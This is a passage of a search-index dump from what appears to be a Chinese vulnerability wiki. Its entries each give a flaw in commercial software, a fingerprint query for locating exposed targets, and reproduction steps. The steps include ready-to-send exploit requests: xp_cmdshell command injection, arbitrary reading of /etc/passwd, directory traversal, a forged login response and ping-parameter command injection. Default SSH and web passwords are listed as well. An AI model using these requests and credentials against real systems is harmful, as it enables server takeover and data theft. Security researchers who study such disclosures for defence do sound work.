","date":"0001-01-01","objectID":"/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"企望制造 ERP comboxstore.action 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 企望制造 ERP comboxstore.action接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令 ","date":"0001-01-01","objectID":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 企望制造 ERP ","date":"0001-01-01","objectID":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"企望制造ERP系统\" ","date":"0001-01-01","objectID":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /mainFunctions/comboxstore.action HTTP/1.1 Content-Type: application/x-www-form-urlencoded Host: comboxsql=exec%20xp_cmdshell%20'type%20C:\\Windows\\Win.ini' ","date":"0001-01-01","objectID":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BC%81%E6%9C%9B%E5%88%B6%E9%80%A0-erp-comboxstore.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"众望网络 微议管理系统 后台updatefile.html 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E4%BC%97%E6%9C%9B%E7%BD%91%E7%BB%9C-%E5%BE%AE%E8%AE%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0updatefile.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BC%97%E6%9C%9B%E7%BD%91%E7%BB%9C-%E5%BE%AE%E8%AE%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0updatefile.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 众望网络 微议管理系统 后台updatefile.html页面任意文件上传漏洞，攻击者通过漏洞可以上传恶意文件控制服务器 ","date":"0001-01-01","objectID":"/%E4%BC%97%E6%9C%9B%E7%BD%91%E7%BB%9C-%E5%BE%AE%E8%AE%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0updatefile.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BC%97%E6%9C%9B%E7%BD%91%E7%BB%9C-%E5%BE%AE%E8%AE%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0updatefile.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 众望网络 微议管理系统 ","date":"0001-01-01","objectID":"/%E4%BC%97%E6%9C%9B%E7%BD%91%E7%BB%9C-%E5%BE%AE%E8%AE%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0updatefile.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BC%97%E6%9C%9B%E7%BD%91%E7%BB%9C-%E5%BE%AE%E8%AE%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0updatefile.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"微议管理系统\" ","date":"0001-01-01","objectID":"/%E4%BC%97%E6%9C%9B%E7%BD%91%E7%BB%9C-%E5%BE%AE%E8%AE%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0updatefile.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BC%97%E6%9C%9B%E7%BD%91%E7%BB%9C-%E5%BE%AE%E8%AE%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0updatefile.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 默认口令 amdin/admin, 服务器更新界面上传PHP文件 访问页面 /Updatefiles/文件名.php ","date":"0001-01-01","objectID":"/%E4%BC%97%E6%9C%9B%E7%BD%91%E7%BB%9C-%E5%BE%AE%E8%AE%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0updatefile.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BC%97%E6%9C%9B%E7%BD%91%E7%BB%9C-%E5%BE%AE%E8%AE%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0updatefile.html-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"会捷通云视讯 fileDownload 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 会捷通云视讯 fileDownload 存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器上的任意文件 ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 会捷通云视讯 ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"/him/api/rest/v1.0/node/role\" ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面如下 发送请求包 POST /fileDownload?action=downloadBackupFile HTTP/1.1 Host: Content-Length: 24 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://36.99.45.142:9090/fileDownload?action=downloadBackupFile Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 fullPath=%2Fetc%2Fpasswd ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-filedownload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"会捷通云视讯 list 目录文件泄露漏洞 ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-list-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-list-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 会捷通云视讯某个文件 list参数 存在目录文件泄露漏洞，攻击者通过漏洞可以获取一些敏感信息 ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-list-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-list-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 会捷通云视讯 ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-list-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-list-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"/him/api/rest/v1.0/node/role\" ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-list-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-list-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面如下 访问Url /him/api/rest/V1.0/system/log/list?filePath=../ ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-list-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-list-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"会捷通云视讯 登录绕过漏洞 ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 会捷通云视讯存在登陆绕过漏洞，通过拦截特定的请求包并修改即可获取后台权限 ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 会捷通云视讯 ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"/him/api/rest/v1.0/node/role\" ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面如下 输入任意账号密码抓包 修改返回包为如下后放包则成功绕过登录 HTTP/1.1 200 Server: Hsengine/1.4.1 Date: Mon, 17 May 2021 16:13:43 GMT Content-Type: application/json;charset=UTF-8 Connection: close X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block Accept-Ranges: bytes Vary: Accept-Charset, Accept-Encoding, Accept-Language, Accept Content-Length: 61 {\"token\":null,\"result\":null} ","date":"0001-01-01","objectID":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"信诺瑞得 WiseGrid慧敏应用交付网关 sysadmin_action.php 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/%E4%BF%A1%E8%AF%BA%E7%91%9E%E5%BE%97-wisegrid%E6%85%A7%E6%95%8F%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%BD%91%E5%85%B3-sysadmin_action.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BF%A1%E8%AF%BA%E7%91%9E%E5%BE%97-wisegrid%E6%85%A7%E6%95%8F%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%BD%91%E5%85%B3-sysadmin_action.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 信诺瑞得 WiseGrid慧敏应用交付网关 sysadmin_action.php 对应的ping功能存在后台命令执行漏洞，通过默认口令可以获取系统权限 ","date":"0001-01-01","objectID":"/%E4%BF%A1%E8%AF%BA%E7%91%9E%E5%BE%97-wisegrid%E6%85%A7%E6%95%8F%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%BD%91%E5%85%B3-sysadmin_action.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BF%A1%E8%AF%BA%E7%91%9E%E5%BE%97-wisegrid%E6%85%A7%E6%95%8F%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%BD%91%E5%85%B3-sysadmin_action.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 信诺瑞得 WiseGrid慧敏应用交付网关 ","date":"0001-01-01","objectID":"/%E4%BF%A1%E8%AF%BA%E7%91%9E%E5%BE%97-wisegrid%E6%85%A7%E6%95%8F%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%BD%91%E5%85%B3-sysadmin_action.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BF%A1%E8%AF%BA%E7%91%9E%E5%BE%97-wisegrid%E6%85%A7%E6%95%8F%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%BD%91%E5%85%B3-sysadmin_action.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"WiseGrid慧敏应用交付网关\" ","date":"0001-01-01","objectID":"/%E4%BF%A1%E8%AF%BA%E7%91%9E%E5%BE%97-wisegrid%E6%85%A7%E6%95%8F%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%BD%91%E5%85%B3-sysadmin_action.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BF%A1%E8%AF%BA%E7%91%9E%E5%BE%97-wisegrid%E6%85%A7%E6%95%8F%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%BD%91%E5%85%B3-sysadmin_action.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 默认口令 ssh：root/sinogrid web: admin/sinogrid ![2](C:/Users/47236/Desktop/2.png)![2](C:/Users/47236/Desktop/2.png)POST /bin/sysadmin_action.php?action=getinfo\u0026operation=ping\u0026destination_value=`id`\u0026ping_count=3\u0026sar_value=3\u0026netstat_value=tcp\u0026interface= HTTP/1.1 Host: Cookie: PHPSESSID=4510o12llugti8k4f24971rdf2; funcs=NNN; appversion=WiseGrid-V4.2.2R_17322; hbstate=alone; username=admin; passwordmd5=ef9ffdf6c1e2fe91d4e14b30323fb771; role=superadmin; authmode=LOCAL; session_time=1639643323; lang=zh; declaration=1; needSyn=false Content-Length: 0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\" Accept: */* X-Requested-With: XMLHttpRequest Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Sec-Ch-Ua-Platform: \"macOS\" Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 X-Forwarded-For: 127.0.0.1 X-Originating-Ip: 127.0.0.1 X-Remote-Ip: 127.0.0.1 X-Remote-Addr: 127.0.0.1 Connection: close ","date":"0001-01-01","objectID":"/%E4%BF%A1%E8%AF%BA%E7%91%9E%E5%BE%97-wisegrid%E6%85%A7%E6%95%8F%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%BD%91%E5%85%B3-sysadmin_action.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BF%A1%E8%AF%BA%E7%91%9E%E5%BE%97-wisegrid%E6%85%A7%E6%95%8F%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%BD%91%E5%85%B3-sysadmin_action.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"吉拉科技 LVS精益价值管理系统 Business 目录遍历漏洞 ","date":"0001-01-01","objectID":"/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80-lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-business-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80-lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-business-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 杭州吉拉科技有限公司多个系统存在目录遍历漏洞，由于 /Business/ 访问控制不严，攻击者可利用该漏洞获取敏感信息。 ","date":"0001-01-01","objectID":"/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80-lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-business-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80-lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-business-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 吉拉科技 LVS精益价值管理系统 ","date":"0001-01-01","objectID":"/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80-lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-business-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80-lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-business-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"Supperd By 吉拉科技\" ","date":"0001-01-01","objectID":"/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80-lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-business-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80-lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-business-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /Business/ ","date":"0001-01-01","objectID":"/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80-lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-business-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%90%89%E6%8B%89%E7%A7%91%E6%8A%80-lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-business-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"员工管理系统 Employee Management System 1.0 身份验证绕过 